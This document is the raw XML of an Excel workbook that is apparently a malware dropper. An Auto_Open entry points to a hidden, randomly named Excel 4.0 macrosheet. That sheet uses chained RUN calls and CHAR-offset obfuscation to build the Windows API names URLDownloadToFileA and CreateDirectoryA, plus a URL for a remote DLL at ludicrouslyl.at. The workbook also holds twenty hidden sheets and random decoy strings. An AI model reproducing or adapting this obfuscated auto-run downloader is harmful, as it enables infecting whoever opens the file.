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macrosheets/sheet1.xml" ContentType="application/vnd.ms-excel.macro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/>
  <workbookPr filterPrivacy="1"/>
  <bookViews>
    <workbookView xWindow="1560" yWindow="1560" windowWidth="15300" windowHeight="7875" firstSheet="20" activeTab="20"/>
  </bookViews>
  <sheets>
    <sheet name="OJxSJzNYHGtfHdpEl" sheetId="2" state="hidden" r:id="rId1"/>
    <sheet name="PUcSxHHFKhovammCG" sheetId="3" state="hidden" r:id="rId2"/>
    <sheet name="Sheet3" sheetId="4" state="hidden" r:id="rId3"/>
    <sheet name="Sheet4" sheetId="5" state="hidden" r:id="rId4"/>
    <sheet name="Sheet5" sheetId="6" state="hidden" r:id="rId5"/>
    <sheet name="Sheet6" sheetId="7" state="hidden" r:id="rId6"/>
    <sheet name="Sheet7" sheetId="8" state="hidden" r:id="rId7"/>
    <sheet name="Sheet8" sheetId="9" state="hidden" r:id="rId8"/>
    <sheet name="Sheet9" sheetId="10" state="hidden" r:id="rId9"/>
    <sheet name="Sheet10" sheetId="11" state="hidden" r:id="rId10"/>
    <sheet name="Sheet11" sheetId="12" state="hidden" r:id="rId11"/>
    <sheet name="Sheet12" sheetId="13" state="hidden" r:id="rId12"/>
    <sheet name="Sheet13" sheetId="14" state="hidden" r:id="rId13"/>
    <sheet name="Sheet14" sheetId="15" state="hidden" r:id="rId14"/>
    <sheet name="Sheet15" sheetId="16" state="hidden" r:id="rId15"/>
    <sheet name="Sheet16" sheetId="17" state="hidden" r:id="rId16"/>
    <sheet name="Sheet17" sheetId="18" state="hidden" r:id="rId17"/>
    <sheet name="Sheet18" sheetId="19" state="hidden" r:id="rId18"/>
    <sheet name="Sheet19" sheetId="20" state="hidden" r:id="rId19"/>
    <sheet name="Sheet20" sheetId="21" state="hidden" r:id="rId20"/>
    <sheet name="Sheet1" sheetId="1" r:id="rId21"/>
  </sheets>
  <definedNames>
    <definedName name="_xlnm.Auto_Open">OJxSJzNYHGtfHdpEl!$IB$1502</definedName>
  </definedNames>
  <calcPr calcId="1456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<sst xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" count="79" uniqueCount="79">
  <si>
    <t>JBZohRyCWyDROwKjj</t>
  </si>
  <si>
    <t>LTfIbHewWwI</t>
  </si>
  <si>
    <t>CUEaKVaXizOWXgFy</t>
  </si>
  <si>
    <t>qsZfyHvbXXWbMSaqRQ</t>
  </si>
  <si>
    <t>gWZRpTxvdSmcThraaN</t>
  </si>
  <si>
    <t>OoxKmG</t>
  </si>
  <si>
    <t>kJbmbYS</t>
  </si>
  <si>
    <t>khFoyF</t>
  </si>
  <si>
    <t>BNdezCLiQsJpvPXMsn</t>
  </si>
  <si>
    <t>nmrcVcHhT</t>
  </si>
  <si>
    <t>jmphG</t>
  </si>
  <si>
    <t>jOxtiDtkxIqqe</t>
  </si>
  <si>
    <t>bCYkygxkoOCztMJfCag</t>
  </si>
  <si>
    <t>cnqGbcmvqUjDXp</t>
  </si>
  <si>
    <t>kZFOPNSDwE</t>
  </si>
  <si>
    <t>hutKORIhwoZH</t>
  </si>
  <si>
    <t>JeHLZjESFrSonQw</t>
  </si>
  <si>
    <t>PBFeFQKcZvSqieqHWrf</t>
  </si>
  <si>
    <t>oMHkmTn</t>
  </si>
  <si>
    <t>sBqWefdiGNUyLLa</t>
  </si>
  <si>
    <t>ehYxNGpXau</t>
  </si>
  <si>
    <t>kpDzivVVwFStOsR</t>
  </si>
  <si>
    <t>iJjuoHpM</t>
  </si>
  <si>
    <t>vHNJUlBIKTq</t>
  </si>
  <si>
    <t>lPRxEXfUzvvuykqx</t>
  </si>
  <si>
    <t>PpoFuxpOrWUC</t>
  </si>
  <si>
    <t>qLBrGQyyllNWiKeJhzL</t>
  </si>
  <si>
    <t>zwqJGdNXdZlC</t>
  </si>
  <si>
    <t>DYajHo</t>
  </si>
  <si>
    <t>RhOUnvk</t>
  </si>
  <si>
    <t>QMMLQBtB</t>
  </si>
  <si>
    <t>JkVlprjJlQBwk</t>
  </si>
  <si>
    <t>FvmBLtsgTtQc</t>
  </si>
  <si>
    <t>qYpcgGtrlEBXtSYUf</t>
  </si>
  <si>
    <t>ixTUeniMbuOhc</t>
  </si>
  <si>
    <t>RwGHFKuovZml</t>
  </si>
  <si>
    <t>CGIzZogRyBWyDRbvKw</t>
  </si>
  <si>
    <t>jKgfIoH</t>
  </si>
  <si>
    <t>GKkKV</t>
  </si>
  <si>
    <t>QhfCXvokvNbxk</t>
  </si>
  <si>
    <t>uSNqrYsxGvbk</t>
  </si>
  <si>
    <t>ljoMSZ</t>
  </si>
  <si>
    <t>ERQgjme</t>
  </si>
  <si>
    <t>ESLvdfzchuranNN</t>
  </si>
  <si>
    <t>owKlGkJaBbmgyhEny</t>
  </si>
  <si>
    <t>FBMdszCLi</t>
  </si>
  <si>
    <t>dHJpvPXMrnn</t>
  </si>
  <si>
    <t>lqcipHhgwmph</t>
  </si>
  <si>
    <t>QtYWEsNEuISCBooQY</t>
  </si>
  <si>
    <t>kNgMjCOCztMJfPafc</t>
  </si>
  <si>
    <t>nFGbclKqUjQWpxnTO</t>
  </si>
  <si>
    <t>PNSDvDhItKOQIhKoZ</t>
  </si>
  <si>
    <t>UJdULYjS</t>
  </si>
  <si>
    <t>RFqSoBPwOzEeSQKcZ</t>
  </si>
  <si>
    <t>vSqvsEH</t>
  </si>
  <si>
    <t>WrsCMHkzTmGBpVefdiT</t>
  </si>
  <si>
    <t>MUxLKaegYxNFpXZtW</t>
  </si>
  <si>
    <t>pDNivjVwTRtb</t>
  </si>
  <si>
    <t>seiJitnGDavUNJUlz</t>
  </si>
  <si>
    <t>VJTqlPQw</t>
  </si>
  <si>
    <t>RWeUzJJINjq</t>
  </si>
  <si>
    <t>xcpoFILDbqjTCEYBG</t>
  </si>
  <si>
    <t>TQyMllNViKdJhyZzLFX</t>
  </si>
  <si>
    <t>GcMXd</t>
  </si>
  <si>
    <t>ZkCRYZjHC</t>
  </si>
  <si>
    <t>fhNUnukQLMKPBHOfGFV</t>
  </si>
  <si>
    <t>LOGeHm</t>
  </si>
  <si>
    <t>BjXriZnxgfTTuDPrL</t>
  </si>
  <si>
    <t>qPgsgeYqnKt</t>
  </si>
  <si>
    <t>FLHSj</t>
  </si>
  <si>
    <t>kGHRoVyOuC</t>
  </si>
  <si>
    <t>UcSxstrwhbiMnYosvm</t>
  </si>
  <si>
    <t>MoUEznJy</t>
  </si>
  <si>
    <t>pEOwwjWwTgubtfj</t>
  </si>
  <si>
    <t>JxuoHEawVbXilBWXh</t>
  </si>
  <si>
    <t>qlPfxSlfVBJK</t>
  </si>
  <si>
    <t>WbMFMqEDTWZRqFxi</t>
  </si>
  <si>
    <t>QSmPUhsNaOzbxwYG</t>
  </si>
  <si>
    <t>XJNnOZTliFb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</si>
</sst>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worksheet" Target="worksheets/sheet17.xml"/><Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/worksheet" Target="worksheets/sheet2.xml"/><Relationship Id="rId21" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/worksheet" Target="worksheets/sheet20.xml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worksheet" Target="worksheets/sheet16.xml"/><Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/worksheet" Target="worksheets/sheet1.xml"/><Relationship Id="rId16" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/worksheet" Target="worksheets/sheet15.xml"/><Relationship Id="rId20" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/worksheet" Target="worksheets/sheet19.xml"/><Relationship Id="rId1" Type="http://schemas.microsoft.com/office/2006/relationships/xlMacrosheet" Target="macro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4.xml"/><Relationship Id="rId15" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/worksheet" Target="worksheets/sheet14.xml"/><Relationship Id="rId23" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/styles" Target="styles.xml"/><Relationship Id="rId10" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/worksheet" Target="worksheets/sheet9.xml"/><Relationship Id="rId19" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/worksheet" Target="worksheets/sheet18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Relationship Id="rId22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13</xdr:col>
      <xdr:colOff>495300</xdr:colOff>
      <xdr:row>20</xdr:row>
      <xdr:rowOff>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420100" cy="3810000"/>
        </a:xfrm>
        <a:prstGeom prst="rect">
          <a:avLst/>
        </a:prstGeom>
      </xdr:spPr>
    </xdr:pic>
    <xdr:clientData/>
  </xdr:twoCellAnchor>
</xdr:wsDr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0:IN1990"/>
  <sheetViews>
    <sheetView showFormulas="1" workbookViewId="0"/>
  </sheetViews>
  <sheetFormatPr defaultRowHeight="15" x14ac:dyDescent="0.25"/>
  <sheetData>
    <row r="10" spans="20:127" x14ac:dyDescent="0.25">
      <c r="T10" t="b">
        <f>RUN($AU$133)</f>
        <v>0</v>
      </c>
    </row>
    <row r="11" spans="20:127" x14ac:dyDescent="0.25">
      <c r="DW11" t="b">
        <f>RUN($O$1979)</f>
        <v>0</v>
      </c>
    </row>
    <row r="13" spans="20:127" x14ac:dyDescent="0.25">
      <c r="CJ13">
        <v>169</v>
      </c>
    </row>
    <row r="21" spans="136:173" x14ac:dyDescent="0.25">
      <c r="EF21" t="b">
        <f>RUN($GQ$330)</f>
        <v>0</v>
      </c>
      <c r="FQ21">
        <v>94</v>
      </c>
    </row>
    <row r="23" spans="136:173" x14ac:dyDescent="0.25">
      <c r="FM23" t="str">
        <f>CHAR($BE$1711-158)</f>
        <v>e</v>
      </c>
    </row>
    <row r="36" spans="141:240" x14ac:dyDescent="0.25">
      <c r="IF36">
        <v>269</v>
      </c>
    </row>
    <row r="38" spans="141:240" x14ac:dyDescent="0.25">
      <c r="EK38" t="str">
        <f>CHAR($AU$828-158)</f>
        <v>n</v>
      </c>
    </row>
    <row r="42" spans="141:240" x14ac:dyDescent="0.25">
      <c r="GW42" t="b">
        <f>RUN($BF$502)</f>
        <v>0</v>
      </c>
    </row>
    <row r="44" spans="141:240" x14ac:dyDescent="0.25">
      <c r="FZ44" t="b">
        <f>RUN($DJ$1862)</f>
        <v>0</v>
      </c>
    </row>
    <row r="50" spans="25:238" x14ac:dyDescent="0.25">
      <c r="ID50" t="str">
        <f>CHAR($IJ$413-158)</f>
        <v>A</v>
      </c>
    </row>
    <row r="52" spans="25:238" x14ac:dyDescent="0.25">
      <c r="BM52" t="b">
        <f>RUN($CM$145)</f>
        <v>0</v>
      </c>
    </row>
    <row r="54" spans="25:238" x14ac:dyDescent="0.25">
      <c r="BB54" t="str">
        <f>$AP$989</f>
        <v>https://ludicrouslyl.at/3/dip.dll</v>
      </c>
    </row>
    <row r="60" spans="25:238" x14ac:dyDescent="0.25">
      <c r="Y60" t="b">
        <f>RUN($FN$1453)</f>
        <v>0</v>
      </c>
    </row>
    <row r="67" spans="22:216" x14ac:dyDescent="0.25">
      <c r="FO67">
        <v>219</v>
      </c>
    </row>
    <row r="69" spans="22:216" x14ac:dyDescent="0.25">
      <c r="FN69">
        <v>160</v>
      </c>
    </row>
    <row r="73" spans="22:216" x14ac:dyDescent="0.25">
      <c r="AY73">
        <v>266</v>
      </c>
    </row>
    <row r="74" spans="22:216" x14ac:dyDescent="0.25">
      <c r="HH74" t="str">
        <f>CONCATENATE($GE$1045)</f>
        <v>Shell32</v>
      </c>
    </row>
    <row r="77" spans="22:216" x14ac:dyDescent="0.25">
      <c r="V77" t="b">
        <f>RUN($FO$889)</f>
        <v>0</v>
      </c>
    </row>
    <row r="83" spans="66:123" x14ac:dyDescent="0.25">
      <c r="BN83">
        <v>186</v>
      </c>
    </row>
    <row r="87" spans="66:123" x14ac:dyDescent="0.25">
      <c r="CZ87" t="str">
        <f>CHAR($Y$220-158)</f>
        <v>n</v>
      </c>
    </row>
    <row r="93" spans="66:123" x14ac:dyDescent="0.25">
      <c r="DS93" t="b">
        <f>RUN($Q$385)</f>
        <v>0</v>
      </c>
    </row>
    <row r="94" spans="66:123" x14ac:dyDescent="0.25">
      <c r="DJ94" t="b">
        <f>RUN($AP$740)</f>
        <v>0</v>
      </c>
    </row>
    <row r="103" spans="111:135" x14ac:dyDescent="0.25">
      <c r="DG103">
        <v>94</v>
      </c>
    </row>
    <row r="106" spans="111:135" x14ac:dyDescent="0.25">
      <c r="EE106" t="str">
        <f>CONCATENATE($S$404,$BM$183,$CP$942,$BC$1114,$AG$1345,$CF$689,$CB$358,$AR$1809)</f>
        <v>Kernel32</v>
      </c>
    </row>
    <row r="116" spans="49:70" x14ac:dyDescent="0.25">
      <c r="BR116">
        <v>985</v>
      </c>
    </row>
    <row r="119" spans="49:70" x14ac:dyDescent="0.25">
      <c r="AW119">
        <v>1006</v>
      </c>
    </row>
    <row r="133" spans="47:184" x14ac:dyDescent="0.25">
      <c r="AU133" t="b">
        <f>RUN($FC$333)</f>
        <v>0</v>
      </c>
    </row>
    <row r="134" spans="47:184" x14ac:dyDescent="0.25">
      <c r="BN134">
        <v>202</v>
      </c>
      <c r="DR134">
        <v>194</v>
      </c>
    </row>
    <row r="141" spans="47:184" x14ac:dyDescent="0.25">
      <c r="GB141" t="b">
        <f>RUN($BM$1518)</f>
        <v>0</v>
      </c>
    </row>
    <row r="144" spans="47:184" x14ac:dyDescent="0.25">
      <c r="FZ144" t="str">
        <f>CHAR($CA$666-102)</f>
        <v>T</v>
      </c>
    </row>
    <row r="145" spans="91:91" x14ac:dyDescent="0.25">
      <c r="CM145" t="b">
        <f>RUN($GB$141)</f>
        <v>0</v>
      </c>
    </row>
    <row r="161" spans="54:203" x14ac:dyDescent="0.25">
      <c r="EF161" t="str">
        <f>CHAR($FM$1635-158)</f>
        <v>e</v>
      </c>
    </row>
    <row r="164" spans="54:203" x14ac:dyDescent="0.25">
      <c r="GG164" t="b">
        <f>RUN($GW$593)</f>
        <v>0</v>
      </c>
    </row>
    <row r="166" spans="54:203" x14ac:dyDescent="0.25">
      <c r="DU166" t="str">
        <f>CHAR($CY$1402-885)</f>
        <v>3</v>
      </c>
    </row>
    <row r="168" spans="54:203" x14ac:dyDescent="0.25">
      <c r="GG168" t="str">
        <f>CHAR($FT$1961-158)</f>
        <v>w</v>
      </c>
    </row>
    <row r="170" spans="54:203" x14ac:dyDescent="0.25">
      <c r="BB170">
        <v>608</v>
      </c>
    </row>
    <row r="173" spans="54:203" x14ac:dyDescent="0.25">
      <c r="GU173">
        <v>70</v>
      </c>
    </row>
    <row r="175" spans="54:203" x14ac:dyDescent="0.25">
      <c r="DW175" t="b">
        <f>RUN($EB$1414)</f>
        <v>0</v>
      </c>
    </row>
    <row r="183" spans="65:160" x14ac:dyDescent="0.25">
      <c r="BM183" t="str">
        <f>CHAR($EO$709-557)</f>
        <v>e</v>
      </c>
    </row>
    <row r="185" spans="65:160" x14ac:dyDescent="0.25">
      <c r="EV185" t="str">
        <f>CHAR($W$788-102)</f>
        <v>z</v>
      </c>
    </row>
    <row r="191" spans="65:160" x14ac:dyDescent="0.25">
      <c r="FD191" t="str">
        <f>CHAR($HK$1692-885)</f>
        <v>l</v>
      </c>
    </row>
    <row r="202" spans="138:138" x14ac:dyDescent="0.25">
      <c r="EH202">
        <v>985</v>
      </c>
    </row>
    <row r="212" spans="6:147" x14ac:dyDescent="0.25">
      <c r="DZ212">
        <v>202</v>
      </c>
    </row>
    <row r="213" spans="6:147" x14ac:dyDescent="0.25">
      <c r="EQ213">
        <v>220</v>
      </c>
    </row>
    <row r="220" spans="6:147" x14ac:dyDescent="0.25">
      <c r="Y220">
        <v>268</v>
      </c>
    </row>
    <row r="221" spans="6:147" x14ac:dyDescent="0.25">
      <c r="DW221" t="str">
        <f>CHAR($CX$1934-557)</f>
        <v>2</v>
      </c>
    </row>
    <row r="222" spans="6:147" x14ac:dyDescent="0.25">
      <c r="AV222">
        <v>81</v>
      </c>
    </row>
    <row r="223" spans="6:147" x14ac:dyDescent="0.25">
      <c r="F223" t="str">
        <f>CHAR($HY$321-102)</f>
        <v>n</v>
      </c>
    </row>
    <row r="224" spans="6:147" x14ac:dyDescent="0.25">
      <c r="AL224" t="str">
        <f>CHAR($GZ$1737-158)</f>
        <v>a</v>
      </c>
    </row>
    <row r="228" spans="15:229" x14ac:dyDescent="0.25">
      <c r="HC228" t="str">
        <f>CONCATENATE($DZ$541,$AU$776,$IL$328,$AL$224,$FC$661,$FR$891,$HX$1715,$FX$1248,$EJ$510,$FM$23,$ES$338,$BG$1757,$AP$540,$DU$1926,$DM$716,$HI$1979)</f>
        <v>CreateDirectoryA</v>
      </c>
    </row>
    <row r="230" spans="15:229" x14ac:dyDescent="0.25">
      <c r="HU230">
        <v>15</v>
      </c>
    </row>
    <row r="234" spans="15:229" x14ac:dyDescent="0.25">
      <c r="O234" t="b">
        <f>RUN($DE$1492)</f>
        <v>0</v>
      </c>
    </row>
    <row r="236" spans="15:229" x14ac:dyDescent="0.25">
      <c r="GI236" t="b">
        <f>RUN($II$603)</f>
        <v>0</v>
      </c>
    </row>
    <row r="242" spans="117:226" x14ac:dyDescent="0.25">
      <c r="GV242" t="str">
        <f>CHAR($CM$1184-557)</f>
        <v>S</v>
      </c>
    </row>
    <row r="252" spans="117:226" x14ac:dyDescent="0.25">
      <c r="HR252" t="str">
        <f>CHAR($CA$1767-885)</f>
        <v>t</v>
      </c>
    </row>
    <row r="255" spans="117:226" x14ac:dyDescent="0.25">
      <c r="DM255">
        <v>997</v>
      </c>
    </row>
    <row r="260" spans="53:148" x14ac:dyDescent="0.25">
      <c r="ER260" t="str">
        <f>CHAR($AZ$858-885)</f>
        <v>c</v>
      </c>
    </row>
    <row r="270" spans="53:148" x14ac:dyDescent="0.25">
      <c r="BA270">
        <v>74</v>
      </c>
    </row>
    <row r="289" spans="68:237" x14ac:dyDescent="0.25">
      <c r="BU289" t="b">
        <f>RUN($BM$52)</f>
        <v>0</v>
      </c>
    </row>
    <row r="290" spans="68:237" x14ac:dyDescent="0.25">
      <c r="EQ290" t="str">
        <f>CHAR($HI$809-158)</f>
        <v>a</v>
      </c>
    </row>
    <row r="297" spans="68:237" x14ac:dyDescent="0.25">
      <c r="BP297">
        <v>671</v>
      </c>
    </row>
    <row r="300" spans="68:237" x14ac:dyDescent="0.25">
      <c r="IC300" t="b">
        <f>RUN($EM$603)</f>
        <v>0</v>
      </c>
    </row>
    <row r="302" spans="68:237" x14ac:dyDescent="0.25">
      <c r="CF302" t="b">
        <f>RUN($AO$1699)</f>
        <v>0</v>
      </c>
    </row>
    <row r="308" spans="123:232" x14ac:dyDescent="0.25">
      <c r="FP308" t="str">
        <f>CHAR($EZ$1946-557)</f>
        <v>U</v>
      </c>
    </row>
    <row r="309" spans="123:232" x14ac:dyDescent="0.25">
      <c r="DS309">
        <v>69</v>
      </c>
    </row>
    <row r="312" spans="123:232" x14ac:dyDescent="0.25">
      <c r="GC312" t="str">
        <f>CHAR($IC$1812-557)</f>
        <v>O</v>
      </c>
    </row>
    <row r="315" spans="123:232" x14ac:dyDescent="0.25">
      <c r="HX315">
        <v>266</v>
      </c>
    </row>
    <row r="321" spans="27:246" x14ac:dyDescent="0.25">
      <c r="HY321">
        <v>212</v>
      </c>
    </row>
    <row r="328" spans="27:246" x14ac:dyDescent="0.25">
      <c r="IL328" t="str">
        <f>CHAR($GF$616-158)</f>
        <v>e</v>
      </c>
    </row>
    <row r="330" spans="27:246" x14ac:dyDescent="0.25">
      <c r="GQ330" t="b">
        <f>RUN($AU$538)</f>
        <v>0</v>
      </c>
    </row>
    <row r="332" spans="27:246" x14ac:dyDescent="0.25">
      <c r="AA332" t="b">
        <f>RUN($DH$774)</f>
        <v>0</v>
      </c>
    </row>
    <row r="333" spans="27:246" x14ac:dyDescent="0.25">
      <c r="FC333" t="b">
        <f>RUN($O$234)</f>
        <v>0</v>
      </c>
    </row>
    <row r="334" spans="27:246" x14ac:dyDescent="0.25">
      <c r="GT334">
        <v>12</v>
      </c>
    </row>
    <row r="337" spans="57:235" x14ac:dyDescent="0.25">
      <c r="BE337" t="str">
        <f>CHAR($DD$1654-885)</f>
        <v>p</v>
      </c>
    </row>
    <row r="338" spans="57:235" x14ac:dyDescent="0.25">
      <c r="ES338" t="str">
        <f>CHAR($HQ$1990-158)</f>
        <v>c</v>
      </c>
      <c r="IA338">
        <v>266</v>
      </c>
    </row>
    <row r="354" spans="80:164" x14ac:dyDescent="0.25">
      <c r="FH354">
        <v>943</v>
      </c>
    </row>
    <row r="358" spans="80:164" x14ac:dyDescent="0.25">
      <c r="CB358" t="str">
        <f>CHAR($AW$1150-557)</f>
        <v>3</v>
      </c>
      <c r="DG358" t="str">
        <f>CHAR($BN$134-102)</f>
        <v>d</v>
      </c>
    </row>
    <row r="373" spans="48:219" x14ac:dyDescent="0.25">
      <c r="AV373" t="str">
        <f>CHAR($FI$1840-102)</f>
        <v>l</v>
      </c>
    </row>
    <row r="374" spans="48:219" x14ac:dyDescent="0.25">
      <c r="HK374" t="str">
        <f>CHAR($BD$1259-158)</f>
        <v>x</v>
      </c>
    </row>
    <row r="377" spans="48:219" x14ac:dyDescent="0.25">
      <c r="CL377">
        <v>999</v>
      </c>
    </row>
    <row r="385" spans="17:218" x14ac:dyDescent="0.25">
      <c r="Q385" t="b">
        <f>RUN($AA$332)</f>
        <v>0</v>
      </c>
    </row>
    <row r="387" spans="17:218" x14ac:dyDescent="0.25">
      <c r="EK387">
        <v>46</v>
      </c>
      <c r="GG387">
        <v>1000</v>
      </c>
    </row>
    <row r="389" spans="17:218" x14ac:dyDescent="0.25">
      <c r="CI389" t="str">
        <f>CHAR($AO$1341-158)</f>
        <v>D</v>
      </c>
      <c r="DZ389">
        <v>73</v>
      </c>
    </row>
    <row r="393" spans="17:218" x14ac:dyDescent="0.25">
      <c r="HJ393" t="str">
        <f>CHAR($CA$757-885)</f>
        <v>l</v>
      </c>
    </row>
    <row r="404" spans="19:244" x14ac:dyDescent="0.25">
      <c r="S404" t="str">
        <f>CHAR($GP$1244-557)</f>
        <v>K</v>
      </c>
    </row>
    <row r="408" spans="19:244" x14ac:dyDescent="0.25">
      <c r="IA408">
        <v>658</v>
      </c>
    </row>
    <row r="411" spans="19:244" x14ac:dyDescent="0.25">
      <c r="GP411" t="str">
        <f>CONCATENATE($AT$918,$BC$1576,$EE$1090,$CI$389,$BI$861,$GG$168,$CZ$87,$EW$793,$CY$1936,$EQ$290,$CC$1143,$IH$1824,$AP$1072,$DP$563,$HB$1047,$BD$1871,$EF$161,$CO$1388)</f>
        <v>URLDownloadToFileA</v>
      </c>
    </row>
    <row r="413" spans="19:244" x14ac:dyDescent="0.25">
      <c r="IJ413">
        <v>223</v>
      </c>
    </row>
    <row r="427" spans="67:203" x14ac:dyDescent="0.25">
      <c r="GU427">
        <v>44</v>
      </c>
    </row>
    <row r="432" spans="67:203" x14ac:dyDescent="0.25">
      <c r="BO432" t="b">
        <f>RUN($DR$1343)</f>
        <v>0</v>
      </c>
    </row>
    <row r="438" spans="119:186" x14ac:dyDescent="0.25">
      <c r="DO438" t="b">
        <f>RUN($DJ$94)</f>
        <v>0</v>
      </c>
    </row>
    <row r="439" spans="119:186" x14ac:dyDescent="0.25">
      <c r="GD439" t="str">
        <f>CHAR($FD$1517-102)</f>
        <v>q</v>
      </c>
    </row>
    <row r="443" spans="119:186" x14ac:dyDescent="0.25">
      <c r="DT443">
        <v>148</v>
      </c>
    </row>
    <row r="463" spans="52:52" x14ac:dyDescent="0.25">
      <c r="AZ463" t="str">
        <f>CHAR($GS$1101-102)</f>
        <v>k</v>
      </c>
    </row>
    <row r="480" spans="183:183" x14ac:dyDescent="0.25">
      <c r="GA480">
        <v>58</v>
      </c>
    </row>
    <row r="485" spans="201:201" x14ac:dyDescent="0.25">
      <c r="GS485">
        <v>51</v>
      </c>
    </row>
    <row r="502" spans="58:140" x14ac:dyDescent="0.25">
      <c r="BF502" t="b">
        <f>RUN($BA$709)</f>
        <v>0</v>
      </c>
    </row>
    <row r="510" spans="58:140" x14ac:dyDescent="0.25">
      <c r="EJ510" t="str">
        <f>CHAR($AM$657-158)</f>
        <v>r</v>
      </c>
    </row>
    <row r="513" spans="217:217" x14ac:dyDescent="0.25">
      <c r="HI513" t="b">
        <f>RUN($CB$1783)</f>
        <v>0</v>
      </c>
    </row>
    <row r="529" spans="23:215" x14ac:dyDescent="0.25">
      <c r="HG529" t="str">
        <f>CHAR($CJ$13-102)</f>
        <v>C</v>
      </c>
    </row>
    <row r="531" spans="23:215" x14ac:dyDescent="0.25">
      <c r="AT531" t="str">
        <f>CHAR($GV$537-885)</f>
        <v>.</v>
      </c>
      <c r="CF531">
        <v>210</v>
      </c>
    </row>
    <row r="537" spans="23:215" x14ac:dyDescent="0.25">
      <c r="GV537">
        <v>931</v>
      </c>
    </row>
    <row r="538" spans="23:215" x14ac:dyDescent="0.25">
      <c r="AU538" t="b">
        <f>RUN($AY$1198)</f>
        <v>0</v>
      </c>
      <c r="DR538" t="b">
        <f>RUN($CM$1800)</f>
        <v>0</v>
      </c>
    </row>
    <row r="540" spans="23:215" x14ac:dyDescent="0.25">
      <c r="AP540" t="str">
        <f>CHAR($HT$637-158)</f>
        <v>o</v>
      </c>
    </row>
    <row r="541" spans="23:215" x14ac:dyDescent="0.25">
      <c r="DZ541" t="str">
        <f>CHAR($FK$1160-158)</f>
        <v>C</v>
      </c>
    </row>
    <row r="543" spans="23:215" x14ac:dyDescent="0.25">
      <c r="W543" t="b">
        <f>RUN($IB$1502)</f>
        <v>0</v>
      </c>
    </row>
    <row r="547" spans="1:80" x14ac:dyDescent="0.25">
      <c r="A547">
        <v>97</v>
      </c>
      <c r="AS547">
        <v>274</v>
      </c>
    </row>
    <row r="553" spans="1:80" x14ac:dyDescent="0.25">
      <c r="F553" t="str">
        <f>CHAR($FX$1842-102)</f>
        <v>Q</v>
      </c>
    </row>
    <row r="559" spans="1:80" x14ac:dyDescent="0.25">
      <c r="CB559" t="str">
        <f>CHAR($AK$640-885)</f>
        <v>a</v>
      </c>
    </row>
    <row r="562" spans="42:220" x14ac:dyDescent="0.25">
      <c r="AR562" t="b">
        <f>RUN($HI$513)</f>
        <v>0</v>
      </c>
    </row>
    <row r="563" spans="42:220" x14ac:dyDescent="0.25">
      <c r="DP563" t="str">
        <f>CHAR($DI$779-158)</f>
        <v>F</v>
      </c>
    </row>
    <row r="566" spans="42:220" x14ac:dyDescent="0.25">
      <c r="AP566" t="b">
        <f>RUN($BU$289)</f>
        <v>0</v>
      </c>
    </row>
    <row r="569" spans="42:220" x14ac:dyDescent="0.25">
      <c r="EA569" t="b">
        <f>RUN($BQ$1950)</f>
        <v>0</v>
      </c>
    </row>
    <row r="570" spans="42:220" x14ac:dyDescent="0.25">
      <c r="EH570" t="str">
        <f>CHAR($FO$67-102)</f>
        <v>u</v>
      </c>
    </row>
    <row r="571" spans="42:220" x14ac:dyDescent="0.25">
      <c r="HL571" t="str">
        <f>CHAR($DR$1560-102)</f>
        <v>b</v>
      </c>
    </row>
    <row r="572" spans="42:220" x14ac:dyDescent="0.25">
      <c r="EG572" t="str">
        <f>CHAR($FW$769-885)</f>
        <v>l</v>
      </c>
    </row>
    <row r="585" spans="94:94" x14ac:dyDescent="0.25">
      <c r="CP585" t="b">
        <f>RUN($AW$785)</f>
        <v>0</v>
      </c>
    </row>
    <row r="593" spans="75:243" x14ac:dyDescent="0.25">
      <c r="GW593" t="b">
        <f>RUN($DS$93)</f>
        <v>0</v>
      </c>
    </row>
    <row r="598" spans="75:243" x14ac:dyDescent="0.25">
      <c r="GZ598">
        <v>86</v>
      </c>
    </row>
    <row r="601" spans="75:243" x14ac:dyDescent="0.25">
      <c r="EC601" t="str">
        <f>CHAR($DM$255-885)</f>
        <v>p</v>
      </c>
    </row>
    <row r="602" spans="75:243" x14ac:dyDescent="0.25">
      <c r="FN602" t="str">
        <f>CHAR($GG$387-885)</f>
        <v>s</v>
      </c>
    </row>
    <row r="603" spans="75:243" x14ac:dyDescent="0.25">
      <c r="EM603" t="b">
        <f>RUN($EF$21)</f>
        <v>0</v>
      </c>
      <c r="II603" t="b">
        <f>RUN($CS$1817)</f>
        <v>0</v>
      </c>
    </row>
    <row r="606" spans="75:243" x14ac:dyDescent="0.25">
      <c r="BW606">
        <v>194</v>
      </c>
    </row>
    <row r="613" spans="18:188" x14ac:dyDescent="0.25">
      <c r="FW613">
        <v>55</v>
      </c>
    </row>
    <row r="615" spans="18:188" x14ac:dyDescent="0.25">
      <c r="R615" t="b">
        <f>RUN($HX$1613)</f>
        <v>0</v>
      </c>
    </row>
    <row r="616" spans="18:188" x14ac:dyDescent="0.25">
      <c r="GF616">
        <v>259</v>
      </c>
    </row>
    <row r="627" spans="37:228" x14ac:dyDescent="0.25">
      <c r="BP627" t="str">
        <f>CHAR($AW$119-885)</f>
        <v>y</v>
      </c>
    </row>
    <row r="637" spans="37:228" x14ac:dyDescent="0.25">
      <c r="HT637">
        <v>269</v>
      </c>
    </row>
    <row r="640" spans="37:228" x14ac:dyDescent="0.25">
      <c r="AK640">
        <v>982</v>
      </c>
    </row>
    <row r="643" spans="37:37" x14ac:dyDescent="0.25">
      <c r="AK643" t="b">
        <f>RUN($GF$1320)</f>
        <v>0</v>
      </c>
    </row>
    <row r="657" spans="39:234" x14ac:dyDescent="0.25">
      <c r="AM657">
        <v>272</v>
      </c>
    </row>
    <row r="661" spans="39:234" x14ac:dyDescent="0.25">
      <c r="FC661" t="str">
        <f>CHAR($AS$547-158)</f>
        <v>t</v>
      </c>
    </row>
    <row r="666" spans="39:234" x14ac:dyDescent="0.25">
      <c r="CA666">
        <v>186</v>
      </c>
    </row>
    <row r="668" spans="39:234" x14ac:dyDescent="0.25">
      <c r="HZ668">
        <v>661</v>
      </c>
    </row>
